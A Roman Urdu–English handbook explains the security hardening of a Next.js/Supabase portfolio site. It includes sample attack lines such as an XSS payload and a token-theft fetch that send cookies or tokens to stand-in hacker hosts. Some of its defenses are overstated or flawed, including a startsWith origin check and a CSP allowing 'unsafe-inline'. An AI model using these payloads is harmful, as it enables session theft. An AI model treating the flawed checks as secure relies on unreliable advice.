# 🛡️ Zero to Hero: The Ultimate Web Security Mastery Handbook
### *Next.js, Full-Stack Architecture, Database Defense & Real-World Cyber Attacks*
**Author:** Mr Saqib Visuals & Engineering Security Team  
**Last Updated:** September 2026  
**Target Environment:** Production Next.js, Supabase, Vercel Edge Network  

---

## 📑 Table of Contents
1. [Introduction: Security Ka Falsafa (The Philosophy of Cyber Security)](#1-introduction)
2. [Security Architecture Overview (High-Level Diagram)](#2-architecture-overview)
3. [Module 1: CSRF & Origin Validation (Cross-Site Request Forgery)](#module-1-csrf--origin-validation)
4. [Module 2: Session Hijacking & Cookie Theft (HttpOnly, Secure, SameSite)](#module-2-session-hijacking--cookie-theft)
5. [Module 3: Brute Force Attacks & Credential Stuffing (IP Rate Limiting & Account Lockout)](#module-3-brute-force--credential-stuffing)
6. [Module 4: Timing Attacks on Cryptography (Constant-Time Verification)](#module-4-timing-attacks-on-cryptography)
7. [Module 5: Password Cracking & Rainbow Tables (PBKDF2 100,000 Rounds + Salting)](#module-5-password-cracking--rainbow-tables)
8. [Module 6: Direct Client-Side Database Tampering (Moving Writes to Authenticated Server APIs)](#module-6-direct-client-database-tampering)
9. [Module 7: Clickjacking & UI Redressing (X-Frame-Options & CSP Frame Ancestors)](#module-7-clickjacking--ui-redressing)
10. [Module 8: MIME Type Sniffing & Drive-By Executions (X-Content-Type-Options)](#module-8-mime-type-sniffing)
11. [Module 9: SSL Stripping & Man-In-The-Middle (MitM) Attacks (HSTS Preload)](#module-9-ssl-stripping--mitm-attacks)
12. [Module 10: Cross-Site Scripting (XSS) & Content Security Policy (CSP)](#module-10-cross-site-scripting--csp)
13. [Module 11: Automated Reconnaissance & Admin Discovery (robots.txt Defense)](#module-11-automated-reconnaissance)
14. [Module 12: AI API Quota Drainage & Form Flooding (Sliding Window & Honeypot Trap)](#module-12-ai-quota-drainage--honeypot)
15. [Module 13: Production Source Code Leaks (Source Maps Hardening)](#module-13-production-source-code-leaks)
16. [Master Security Checklist & Verification Commands](#master-security-checklist)

---

## 1. Introduction: Security Ka Falsafa
Web development mein aksar beginners sirf is baat par focus karte hain ke *"Website kaam kar rahi hai ya nahi"*. Lekin ek **Senior Full-Stack Architect** hamesha is angle se sochta hai:
> *"Agar koi bad-niyat shakhs (Attacker/Hacker) mere system par aam user ki tarah nahi balke Burp Suite, Python scripts, automated bots aur malicious payloads ke sath hamla kare, toh meri application ka kya banega?"*

Web Security koi ek single plugin ya setting nahi hai. Isay **"Defense in Depth" (Layers of Security)** kaha jata hai. Agar hacker pehli deewar torh bhi le, toh doosri deewar usay rokay, aur doosri tootay toh teesri usay qaid kar le.

---

## 2. Security Architecture Overview

Neeche diye gaye diagram ko ghaur se samjhein ke request internet se aane ke baad kin kin security filters se guzarti hai:

```
[ 🌐 Internet / User / Attacker ]
               │
               ▼
┌────────────────────────────────────────────────────────┐
│ 🛡️ LAYER 1: Browser & Edge Headers (next.config.mjs)   │
│ • HSTS (Force HTTPS)                                   │
│ • X-Frame-Options: DENY (Anti-Clickjacking)            │
│ • X-Content-Type-Options: nosniff                      │
│ • Content-Security-Policy (CSP Script & Media Lockdown)│
│ • Referrer-Policy: strict-origin-when-cross-origin     │
└────────────────────────────────────────────────────────┘
               │
               ▼
┌────────────────────────────────────────────────────────┐
│ 🛡️ LAYER 2: Request Inspection & Rate Limiting         │
│ • IP-based Sliding Window Shield (Max req/min)         │
│ • Honeypot Trap (Automated Bot neutralizer)            │
│ • Payload Size Restrictions (Max JSON length)          │
└────────────────────────────────────────────────────────┘
               │
               ▼
┌────────────────────────────────────────────────────────┐
│ 🛡️ LAYER 3: Origin & CSRF Defense                      │
│ • validateRequestOrigin(req)                           │
│ • Block requests from evil-hacker.com                  │
└────────────────────────────────────────────────────────┘
               │
               ▼
┌────────────────────────────────────────────────────────┐
│ 🛡️ LAYER 4: Session & Cryptographic Token Auth         │
│ • extractSessionToken() (Cookie / Bearer Header)       │
│ • PBKDF2 & HMAC Signature Verification                 │
│ • Timing-Safe Comparison (Anti-Side-Channel)           │
└────────────────────────────────────────────────────────┘
               │
               ▼
┌────────────────────────────────────────────────────────┐
│ 🛡️ LAYER 5: Isolated Server-Side Database Execution    │
│ • supabaseAdmin (Service Role Key isolated on server)  │
│ • Parameterized Queries (Anti-SQL Injection)           │
│ • Sanitized Data Mutation                              │
└────────────────────────────────────────────────────────┘
```

---

## Module 1: CSRF & Origin Validation
### (Cross-Site Request Forgery)

### 1. Attack Ka Naam & Concept
**Attack Name:** Cross-Site Request Forgery (CSRF)  
**OWASP Category:** Broken Access Control / Insecure Direct Object References

### 2. Hacker Kya Sochta Hai & Attack Kaise Karta Hai?
Maan lijiye aap apne Admin Dashboard par logged in hain. Aapka session cookie browser mein active hai.
Hacker aapko ek email ya WhatsApp par link bhejta hai:
`"Check out this cool developer tool: https://free-tools-gift.com"`

Aap us link par click karte hain. Us website ke code ke andar chupkay se ek background JavaScript script chalta hai:
```javascript
// Hacker ki website ka code (evil.com):
fetch('https://mrsaqib242.vercel.app/api/admin/projects', {
  method: 'DELETE',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ id: 'project_1' })
});
```
Kyunke aapka browser `mrsaqib242.vercel.app` ko jaanta hai aur cookies sath bhej sakta hai, bina CSRF defense ke yeh request execute ho jaati aur aapka project **delete** ho jata!

### 3. Agar Security Na Hoti Toh Kya Nuqsan Hota?
Hacker aapke admin credentials jaane baghair sirf aapko ek link par click karwa kar aapka poora portfolio delete kar sakta tha ya apna ganda data inject kar sakta tha.

### 4. Humne Code Mein Kaise Save Kiya?
Hamare project mein [src/lib/serverAdminAuth.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/lib/serverAdminAuth.ts) ke andar `validateRequestOrigin` function banaya gaya:

```typescript
export function validateRequestOrigin(req: NextApiRequest): boolean {
  const origin = req.headers['origin'] || '';
  const referer = req.headers['referer'] || '';
  
  // Local development + Live Production Domains
  const allowed = [
    'https://mrsaqib242.vercel.app',
    'http://localhost:3000',
    'http://127.0.0.1:3000'
  ];

  // Agar request kisi aur domain (e.g. evil-hacker.com) se aayi ho:
  if (origin && !allowed.some(domain => origin.startsWith(domain))) {
    return false; // INSTANT BLOCK!
  }
  return true;
}
```

Aur har admin API endpoint ([src/pages/api/admin/projects.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/projects.ts)) mein line 9 par check lagaya:
```typescript
if (req.method !== 'GET' && !validateRequestOrigin(req)) {
  return res.status(403).json({ error: 'Forbidden: Request origin invalid.' });
}
```

### 5. Proof / Verification:
Jab hacker ki domain se request aati hai, server seedha **`403 Forbidden`** phenk kar request ko kachre mein daal deta hai:
```bash
curl -i -X POST https://mrsaqib242.vercel.app/api/admin/projects -H "Origin: https://evil.com"
# Result: HTTP/1.1 403 Forbidden {"error":"Forbidden: Request origin invalid."}
```

---

## Module 2: Session Hijacking & Cookie Theft
### (HttpOnly, Secure, SameSite=Strict)

### 1. Attack Ka Naam & Concept
**Attack Name:** Session Hijacking via XSS / Man-In-The-Middle Cookie Theft

### 2. Hacker Kaise Attack Karta Hai?
Agar authentication token `localStorage` mein store ho, ya cookie aam (non-HttpOnly) ho:
Hacker website ke kisi bhi script, third-party library ya widget ke zariye console mein run karta hai:
```javascript
const stolenToken = localStorage.getItem('admin_token');
// ya
const stolenCookie = document.cookie;
fetch('https://hacker-c2-server.com/log?token=' + stolenToken);
```
Token chori hotay hi hacker apne browser mein wo token paste karta hai aur bina password ke aapka admin ban jata hai!

### 3. Humne Code Mein Kaise Save Kiya?
Humne tokens ko `localStorage` se hata kar **Encrypted HttpOnly Server Cookies** mein convert kiya:

```typescript
// src/lib/serverAdminAuth.ts
export function setAdminSessionCookie(res: NextApiResponse, token: string): void {
  const cookieValue = [
    `saqib_admin_session=${encodeURIComponent(token)}`,
    'Path=/',
    'HttpOnly',              // 🛡️ JavaScript cannot read this cookie (No XSS theft!)
    'Secure',                // 🛡️ Only sent over HTTPS
    'SameSite=Strict',       // 🛡️ Never sent on cross-site requests (Anti-CSRF)
    `Max-Age=${7 * 24 * 3600}` // 7 days expiry
  ].join('; ');

  res.setHeader('Set-Cookie', cookieValue);
}
```

### 4. Hacker Kyun Haar Gaya?
- **`HttpOnly`:** Browser ka JavaScript engine `document.cookie` se is cookie ko parhne se inkaar kar deta hai. Agar hacker XSS attack chala bhi le, tab bhi token chori nahi ho sakta!
- **`SameSite=Strict`:** Jab tak user direct aapki website ke andar na ho, browser doosri websites ke click par cookie bhejta hi nahi hai!

---

## Module 3: Brute Force & Credential Stuffing
### (IP Rate Limiting & Account Lockout Shield)

### 1. Attack Ka Naam & Concept
**Attack Name:** Automated Dictionary Attack & Credential Stuffing

### 2. Hacker Kaise Attack Karta Hai?
Hacker ek automation tool (jaise Python script ya Burp Suite Intruder) kholta hai aur 10,000 common passwords ki list run kar deta hai:
- `admin / 123456`
- `saqib / password123`
- `saqib / saqib2024`
- Har second mein 50 requests aati hain. Agar rate limiting na ho toh kuch ghanton mein password guess ho jata hai.

### 3. Humne Code Mein Kaise Save Kiya?
[src/lib/serverAdminAuth.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/lib/serverAdminAuth.ts) ke andar brute-force lockout engine banaya:

```typescript
interface LoginAttemptRecord {
  attempts: number;
  lockedUntil: number;
}
const loginAttemptsMap = new Map<string, LoginAttemptRecord>();

// Har request par IP check hoti hai:
const record = loginAttemptsMap.get(clientIp);
if (record && record.lockedUntil > Date.now()) {
  const secondsLeft = Math.ceil((record.lockedUntil - Date.now()) / 1000);
  return { 
    success: false, 
    locked: true, 
    remainingLockSeconds: secondsLeft, 
    message: `Account temporarily locked due to multiple failed logins. Try again in ${secondsLeft}s.` 
  };
}

// Agar 5 martaba ghalat password daala:
if (record.attempts >= 5) {
  record.lockedUntil = Date.now() + 15 * 60 * 1000; // 15 MINUTES COMPLETE LOCKOUT!
}
```

### 4. Hacker Kyun Haar Gaya?
5 ghalat attempts ke baad hacker ka IP address **15 minute ke liye ban** ho jata hai aur server **HTTP 429 Too Many Requests** return karta hai. Ek dictionary attack jo 1 ghante mein hona tha ab usay 20 saal lag jayenge!

---

## Module 4: Timing Attacks on Cryptography
### (Constant-Time Verification via timingSafeEqual)

### 1. Attack Ka Naam & Concept
**Attack Name:** Side-Channel Timing Attack (Nanosecond Measurement)

### 2. Hacker Kya Karta Hai?
Aam JavaScript code mein do strings ko aise compare kiya jata hai:
```javascript
if (userProvidedToken === actualServerToken) // ❌ DANGEROUS!
```
Normal string comparison pehle character se shuru hoti hai. Jaise hi pehla character mismatch hota hai, JavaScript execution stop kar deta hai:
- Agar pehla character ghalat ho: Time laga `0.001 ms`
- Agar pehla sahi ho lekin doosra ghalat: Time laga `0.002 ms`
- Agar 10 characters sahi hon: Time laga `0.010 ms`
Hacker server ke response time ko high-precision timer se nap kar character-by-character token guess kar leta hai!

### 3. Humne Code Mein Kaise Save Kiya?
Humne Node.js ke cryptographic hardware-level `crypto.timingSafeEqual` function ka istemal kiya:

```typescript
// src/lib/serverAdminAuth.ts
import crypto from 'crypto';

export function constantTimeCompare(a: string, b: string): boolean {
  const bufA = Buffer.from(a, 'utf8');
  const bufB = Buffer.from(b, 'utf8');

  // Length match nahi toh safe exit
  if (bufA.length !== bufB.length) return false;

  // Har character ko barabar waqt mein check karta hai (Constant Time O(1))
  return crypto.timingSafeEqual(bufA, bufB);
}
```

### 4. Hacker Kyun Haar Gaya?
Chahe token ka pehla harf ghalat ho ya aakhri, function har bar theek utna hi time leta hai. Hacker ke paas response time se token guess karne ka 0% chance bachta hai!

---

## Module 5: Password Cracking & Rainbow Tables
### (PBKDF2 with 100,000 Rounds + Cryptographic Salt)

### 1. Attack Ka Naam & Concept
**Attack Name:** Offline Rainbow Table Lookup & GPU Hash Cracking

### 2. Hacker Kya Karta Hai?
Agar database leak ho jaye aur passwords plain text ya aam MD5/SHA256 mein hon:
- `MD5("saqib242") = "8e0259b660f897b..."`
Hacker pre-computed tables (Rainbow Tables) mein search karta hai aur 1 second mein password dhoondh leta hai.

### 3. Humne Code Mein Kaise Save Kiya?
Humne **PBKDF2 (Password-Based Key Derivation Function 2)** lagaya:
1. **Unique Salt:** Har hash ke sath ek random cryptographic salt judti hai.
2. **100,000 Iterations:** Hash ko 100,000 martaba mathematical loop se guzara jata hai.

```typescript
// src/lib/serverAdminAuth.ts
export function hashPasswordPBKDF2(password: string, salt: string): string {
  const iterations = 100000; // 100,000 cryptographic rounds
  const keylen = 64;
  const digest = 'sha512';
  return crypto.pbkdf2Sync(password, salt, iterations, keylen, digest).toString('hex');
}
```

### 4. Result:
Ek modern RTX 4090 GPU jo standard MD5 ke 100 Billion hashes per second crack kar sakta hai, PBKDF2 ke mushkil se chand thousand check kar pata hai. Password crack karna virtually impossible ban jata hai!

---

## Module 6: Direct Client Database Tampering
### (Moving Writes to Authenticated Server APIs)

### 1. Attack Ka Naam & Concept
**Attack Name:** Client-Side Database Hijacking / Insecure Direct Object References (IDOR)

### 2. Hacker Kaise Attack Karta Tha (Puraana Tareeqa)?
Pehle agar client code mein Supabase ki direct update calls hon:
```javascript
// Browser Console mein hacker likhta tha:
await supabase.from('projects').delete().neq('id', '0');
```
Kyunke Supabase ka URL aur Anon Key frontend JavaScript mein visible hote hain, hacker browser ke developer tools khol kar database par direct SQL commands run karne ki koshish karta tha.

### 3. Humne Code Mein Kaise Save Kiya?
Humne tamaam state-modifying actions (Insert, Update, Delete) ko frontend se nikaal kar **Protected Next.js Server APIs** mein shift kar diya:

- [src/pages/api/admin/projects.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/projects.ts)
- [src/pages/api/admin/gallery.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/gallery.ts)
- [src/pages/api/admin/inquiries.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/inquiries.ts)
- [src/pages/api/admin/pricing.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/pricing.ts)
- [src/pages/api/admin/tools.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/tools.ts)

Frontend ab sirf server endpoint ko call karta hai:
```typescript
// Frontend service: src/lib/projectsService.ts
const res = await fetch('/api/admin/projects', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include', // Server cookie automatically passes
  body: JSON.stringify({ project })
});
```

Server par:
1. `validateRequestOrigin(req)` check hota hai.
2. `verifyAdminSessionToken(token)` verify hota hai.
3. Agar authenticated ho, tab server-side `supabaseAdmin` (jiska key client ke paas kabhi nahi hota) database ko securely update karta hai.

---

## Module 7: Clickjacking & UI Redressing
### (X-Frame-Options: DENY & CSP frame-ancestors)

### 1. Attack Ka Naam & Concept
**Attack Name:** Clickjacking (UI Redress Attack)

### 2. Hacker Kaise Attack Karta Hai?
Hacker ek website banata hai: `free-prize-winner.com`.
Wo background mein aapki website ko ek invisible iframe mein load kar deta hai (`opacity: 0`).
Iframe ke theek us button par jahan aapka "Delete Project" ya "Change Admin Password" ka button hai, hacker upar ek aam button laga deta hai: *"Click here to claim $1000"*.
Aap us prize wale button par click karte hain, lekin asal mein click aapki website ke invisible button par hota hai!

### 3. Humne Code Mein Kaise Save Kiya?
[next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) mein strict security headers lagaye:

```javascript
{
  key: 'X-Frame-Options',
  value: 'DENY', // 🛡️ Kisi bhi iframe mein open hona sakhti se mana hai!
},
{
  key: 'Content-Security-Policy',
  value: "... frame-ancestors 'none'; ...", // Modern W3C Standard
}
```

### 4. Hacker Kyun Haar Gaya?
Duniya ka koi bhi browser jab `X-Frame-Options: DENY` dekhta hai, toh wo iframe ke andar page load karne se foran inkaar kar deta hai aur screen grey/blank ho jaati hai!

---

## Module 8: MIME Type Sniffing & Drive-By Executions
### (X-Content-Type-Options: nosniff)

### 1. Attack Ka Naam & Concept
**Attack Name:** MIME Confused Attack / Drive-By Code Execution

### 2. Hacker Kaise Attack Karta Hai?
Hacker aapki site par ek photo upload karne ki koshish karta hai: `avatar.jpg`.
Lekin asal mein us file ke andar JavaScript ka virus hota hai:
`<script>maliciousCode()</script>`
Agar server `Content-Type: image/jpeg` bhejta hai, toh purane ya weak browsers file ke pehle chand bytes check karke kehte hain: *"Arrey yeh toh script jesi lag rahi hai, chalo ise JavaScript samajh kar run kar dete hain!"*

### 3. Humne Code Mein Kaise Save Kiya?
[next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) mein header diya:
```javascript
{
  key: 'X-Content-Type-Options',
  value: 'nosniff', // 🛡️ Browser ko order hai ke khud se dimagh na chalaye!
}
```

### 4. Result:
Browser sirf usi format mein file ko render karega jo server ne declare kiya hai. Malicious script execution 100% block ho jati hai.

---

## Module 9: SSL Stripping & Man-In-The-Middle (MitM) Attacks
### (HSTS: Strict-Transport-Security Preload)

### 1. Attack Ka Naam & Concept
**Attack Name:** SSL Stripping & Man-In-The-Middle (MitM) Packet Sniffing

### 2. Hacker Kaise Attack Karta Hai?
Maan lijiye aap kisi cafe, airport, ya public Wi-Fi par baithe hain.
Hacker usi Wi-Fi par ek software (jaise `sslstrip` ya `Wireshark`) chalata hai.
Jab aap `mrsaqib242.vercel.app` likhte hain, browser pehle HTTP par request bhejta hai taake HTTPS par redirect ho sake.
Hacker us redirect ko beech mein hi rok leta hai aur aapko HTTP (unencrypted) connection par rakhta hai, jis se aapke saare passwords aur inquiries hacker ke laptop par clear text mein show hoti hain!

### 3. Humne Code Mein Kaise Save Kiya?
[next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) mein humne **HSTS Preload Standard** enforce kiya:

```javascript
{
  key: 'Strict-Transport-Security',
  value: 'max-age=63072000; includeSubDomains; preload', // 🛡️ 2 Years HTTPS Enforcement
}
```

### 4. Result:
Browser ko memory mein yaad rehta hai ke is website se **kabhi bhi HTTP par baat nahi karni**, chahe user explicitly `http://` bhi likhe, browser request bhejne se pehle hi usay HTTPS mein convert kar deta hai!

---

## Module 10: Cross-Site Scripting (XSS) & Content Security Policy (CSP)

### 1. Attack Ka Naam & Concept
**Attack Name:** Cross-Site Scripting (Stored & Reflected XSS)  
**OWASP Category:** A03:2021-Injection

### 2. Hacker Kaise Attack Karta Hai?
Hacker inquiry form ya feedback section mein apna naam likhta hai:
`<img src=x onerror="fetch('https://hacker.com/steal?data=' + document.cookie)">`
Agar ye naam bina sanitization ke page par render ho jaye, toh website dekhne wale har visitor aur admin ke browser mein hacker ka script chal jayega!

### 3. Humne Code Mein Kaise Save Kiya?
1. **JSON-LD Schema Encoding:** [src/pages/_app.tsx](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/_app.tsx) mein `<` character ko replace kiya:
   ```typescript
   JSON.stringify(unifiedSchema).replace(/</g, '\\u003c')
   ```
2. **Content Security Policy (CSP):** [next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) ke zariye browser ko strictly bata diya gaya ke scripts sirf hamari domain aur verified Google Analytics se execute hon:
   ```javascript
   default-src 'self';
   script-src 'self' 'unsafe-eval' 'unsafe-inline' https://www.googletagmanager.com https://www.google-analytics.com;
   img-src 'self' data: blob: https: https://ik.imagekit.io;
   connect-src 'self' https://*.supabase.co wss://*.supabase.co;
   frame-ancestors 'none';
   ```

### 4. Result:
Agar koi hacker kisi injection ke zariye malicious domain se script load karne ki koshish bhi kare, toh browser ka CSP parser us script ko network level par hi **Refuse to execute** kar deta hai!

---

## Module 11: Automated Reconnaissance & Admin Discovery
### (robots.txt Defense)

### 1. Attack Ka Naam & Concept
**Attack Name:** Directory Harvesting & Admin Discovery via Search Engine Reconnaissance

### 2. Hacker Kaise Attack Karta Hai?
Hackers manual scanning karne se pehle target website ka `robots.txt` file check karte hain:
```
# GHALAT robots.txt:
User-agent: *
Disallow: /mradmin   <-- ❌ Hacker ko pata chal gaya ke admin portal ka secret url "/mradmin" hai!
```
Security through obscurity ka rule hai ke kabhi bhi apne secret endpoints khud public directory mein expose na karein.

### 3. Humne Code Mein Kaise Save Kiya?
[public/robots.txt](file:///C:/Users/saqib/Downloads/mrsaqib242/public/robots.txt) se `/mradmin` ko nikaal diya gaya:
```
User-agent: *
Allow: /
Disallow: /api/
Disallow: /admin
Disallow: /private/
```
Ab automated bots ya recon tools ko pata hi nahi chalta ke admin portal ka exact address kya hai.

---

## Module 12: AI API Quota Drainage & Form Flooding
### (Sliding Window Rate Limiter & Honeypot Trap)

### 1. Attack Ka Naam & Concept
**Attack Name:** Denial of Wallet (DoW) & Automated Spam Bot Flooding

### 2. Hacker Kaise Attack Karta Hai?
- **AI Quota Attack:** Hamari website par Gemini AI engine chalta hai (`/api/geo`). Agar koi bot script bana kar 10,000 requests bhej de, toh hamara Google Cloud / Gemini API quota khatam ho jayega ya hazaron rupaye ka bill ban jayega.
- **Form Spam:** Automated spam bots inquiry form par second mein 500 fake messages bhejte hain.

### 3. Humne Code Mein Kaise Save Kiya?

#### A. Gemini AI Sliding Window Rate Limiter ([src/pages/api/geo.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/geo.ts)):
```typescript
const geoRateLimitMap = new Map<string, { count: number; resetTime: number }>();

function checkGeoRateLimit(ip: string): boolean {
  const now = Date.now();
  const windowMs = 60 * 1000; // 1 minute window
  const maxRequests = 10;     // Max 10 AI queries per minute per IP

  const current = geoRateLimitMap.get(ip);
  if (!current || now > current.resetTime) {
    geoRateLimitMap.set(ip, { count: 1, resetTime: now + windowMs });
    return true;
  }
  if (current.count >= maxRequests) return false; // 🚫 Block!
  current.count++;
  return true;
}
```

#### B. The Honeypot Trap ([src/lib/inquiriesService.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/lib/inquiriesService.ts)):
Form ke andar ek hidden field banayi gayi jo CSS se aam insano ko nazar nahi aati:
```html
<input type="text" name="honeypot" style="display:none" tabindex="-1" autocomplete="off" />
```
Automated spam bots har input field ko fill karte hain. Agar is field mein koi text aaya, toh backend foran samajh jata hai ke yeh koi bot hai aur request ko database mein save kiye baghair silently ignore kar deta hai!

---

## Module 13: Production Source Code Leaks
### (Source Maps Hardening)

### 1. Attack Ka Naam & Concept
**Attack Name:** Client-Side Source Map Reverse Engineering

### 2. Hacker Kaise Attack Karta Hai?
Jab developers `productionBrowserSourceMaps: true` on chhor dete hain:
Hacker Chrome DevTools > **Sources Tab** kholta hai aur aapka poora original TypeScript code (with comments, helper functions, aur internal API architectures) bilkul saaf saaf parh leta hai!

### 3. Humne Code Mein Kaise Save Kiya?
[next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) mein production browser source maps ko **disabled** rakha gaya hai. Production build mein sirf minified, obfuscated chunk files hoti hain jahan se code reverse engineer karna namumkin hota hai.

---

## Master Security Checklist & Verification Commands

Aap jab bhi apna code verify karna chahein, in terminal commands se foran check kar sakte hain:

### 1. Test Admin Endpoint Security (Token Required):
```bash
curl.exe -i -s https://mrsaqib242.vercel.app/api/admin/projects
# Expected Response: 401 Unauthorized {"error":"Unauthorized: Admin token required."}
```

### 2. Test CSRF Protection (Fake Origin Block):
```bash
curl.exe -i -X POST https://mrsaqib242.vercel.app/api/admin/projects -H "Origin: https://evil.com"
# Expected Response: 403 Forbidden {"error":"Forbidden: Request origin invalid."}
```

### 3. Test Security HTTP Headers (HSTS, CSP, X-Frame-Options):
```bash
curl.exe -s -D - -o nul https://mrsaqib242.vercel.app/
# Look for:
# - Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
# - X-Frame-Options: DENY
# - X-Content-Type-Options: nosniff
# - Content-Security-Policy: default-src 'self'...
```

---

## 🎓 Khulasa (Conclusion)
Aapki application ab ek standard website se nikal kar **Enterprise-Grade Secured Web Application** ban chuki hai. Har layer par validation, cryptography, sanitization aur origin protection ka pehra laga hua hai. Is handbook ko hamesha apne paas mehfooz rakhein taake aage ja kar aap jo bhi naya project banayein, usmein bhi yehi gold standard security implement kar sakein!
